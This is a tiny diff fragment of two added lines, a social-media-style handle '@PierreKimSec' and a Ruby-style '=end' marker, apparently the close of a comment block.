+@PierreKimSec
+=end
